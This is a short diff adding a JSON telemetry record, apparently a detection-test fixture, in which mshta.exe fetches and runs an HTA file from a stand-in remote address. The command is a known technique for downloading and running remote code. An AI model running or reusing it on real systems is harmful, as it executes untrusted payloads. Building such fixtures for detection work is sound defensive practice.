@@ -1,0 +1,4 @@
+{"DeviceProcessEvents": [
+  {"FolderPath":"C:\\Windows\\System32\\mshta.exe",
+   "ProcessCommandLine":"mshta.exe http://203.0.113.10/update.hta"}
+]}
